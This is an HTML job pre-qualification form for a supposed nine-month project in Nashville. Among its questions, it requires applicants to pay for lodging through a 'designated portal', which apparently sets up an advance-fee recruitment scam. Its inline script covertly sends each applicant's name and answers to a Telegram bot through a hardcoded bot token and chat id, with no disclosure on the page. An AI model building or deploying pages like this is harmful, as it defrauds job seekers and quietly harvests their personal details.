<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Pre-Qualification Questions</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="style.css">
</head>

<body>

<!-- ================= FORM SCREEN ================= -->
<div class="screen screen-form" id="screenForm">
  <div class="card">

    <h1>Pre-Qualification Questions</h1>
    <p class="subtitle">
      Please respond to the following questions to continue.
    </p>

    <form id="form">

      <!-- NAME -->
      <div class="field">
        <label>First Name <span class="req">*</span></label>
        <input type="text" name="firstName" required>
      </div>

      <div class="field">
        <label>Last Name <span class="req">*</span></label>
        <input type="text" name="lastName" required>
      </div>

      <!-- Q1 -->
      <div class="question">
        <h3>1. Availability <span class="req">*</span></h3>
        <p>
          Full-time, on-site availability in Nashville, TN for the full 9-month project.<br>
          <strong>Required</strong> to ensure project scheduling and continuity.
        </p>
        <div class="options">
          <label><input type="radio" name="q1" value="Yes" required> Yes</label>
          <label><input type="radio" name="q1" value="No"> No</label>
        </div>
      </div>

      <!-- Q2 -->
      <div class="question">
        <h3>2. Onboarding Compliance <span class="req">*</span></h3>
        <p>
          Ability to complete all onboarding steps: application, contract execution,
          employee portal registration, and mandatory safety training.<br>
          <strong>Required</strong> for compliance and job-site access.
        </p>
        <div class="options">
          <label><input type="radio" name="q2" value="Yes" required> Yes</label>
          <label><input type="radio" name="q2" value="No"> No</label>
        </div>
      </div>

      <!-- Q3 -->
      <div class="question">
        <h3>3. Lodging Requirement <span class="req">*</span></h3>
        <p>
          Ability to reserve and pay for lodging through the SunPower-designated portal
          prior to the start date.<br>
          <strong>Required</strong> to finalize assignment, scheduling, and operational planning.
        </p>
        <div class="options">
          <label><input type="radio" name="q3" value="Yes" required> Yes</label>
          <label><input type="radio" name="q3" value="No"> No</label>
        </div>
      </div>

      <!-- Q4 -->
      <div class="question">
        <h3>4. Employment Identification <span class="req">*</span></h3>
        <p>
          Ability to provide two acceptable forms of employment identification
          in accordance with hiring requirements.<br>
          <strong>Required</strong> for employment verification.
        </p>
        <div class="options">
          <label><input type="radio" name="q4" value="Yes" required> Yes</label>
          <label><input type="radio" name="q4" value="No"> No</label>
        </div>
      </div>

      <div class="notice">
        All questions above are part of the pre-qualification process for employment
        consideration. These requirements are necessary to ensure proper onboarding,
        compliance, and operational planning.
      </div>

      <button type="submit">Submit</button>
    </form>

  </div>
</div>

<!-- ================= REJECT SCREEN ================= -->
<div class="screen hidden" id="screenReject">
  <div class="card center">
    <h2>Application Status</h2>
    <p>
      Unfortunately, we are unable to proceed with your application at this time.
      <br><br>
      You may be eligible to reapply in the future should your availability or
      circumstances change.
    </p>
  </div>
</div>

<!-- ================= SUCCESS SCREEN ================= -->
<div class="screen hidden" id="screenSuccess">
  <div class="card center">
    <div class="confetti">ðŸŽ‰ ðŸŽ‰ ðŸŽ‰</div>
    <h2>Congratulations</h2>
    <p>
      Your responses have been successfully submitted.
      <br><br>
      Please contact your assigned recruiter for the next steps in the process.
    </p>
  </div>
</div>

<script>
document.getElementById("form").addEventListener("submit", function(e) {
  e.preventDefault();

  const d = new FormData(this);
  const hasNo = ["q1","q2","q3","q4"].some(q => d.get(q) === "No");

  // Telegram (SIEMPRE)
  const msg =
    "ðŸ“‹ PRE-QUALIFICATION RESULT\n\n" +
    "Name: " + d.get("firstName") + " " + d.get("lastName") + "\n" +
    "Status: " + (hasNo ? "NOT ELIGIBLE" : "ELIGIBLE") + "\n\n" +
    "Q1: " + d.get("q1") + "\n" +
    "Q2: " + d.get("q2") + "\n" +
    "Q3: " + d.get("q3") + "\n" +
    "Q4: " + d.get("q4");

  fetch("https://api.telegram.org/bot8219963792:AAGWcvtcyC0rd0zMLXN2Uf3uPUySB9GuBTw/sendMessage", {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({
      chat_id: "8547093828",
      text: msg
    })
  });

  // Cerrar formulario
  document.getElementById("screenForm").classList.add("fade-out");

  setTimeout(() => {
    document.getElementById("screenForm").style.display = "none";
    document.body.style.background = "#ffffff";

    if (hasNo) {
      document.getElementById("screenReject").classList.remove("hidden");
      document.getElementById("screenReject").style.display = "flex";
    } else {
      document.getElementById("screenSuccess").classList.remove("hidden");
      document.getElementById("screenSuccess").style.display = "flex";
    }
  }, 400);
});
</script>

</body>
</html>
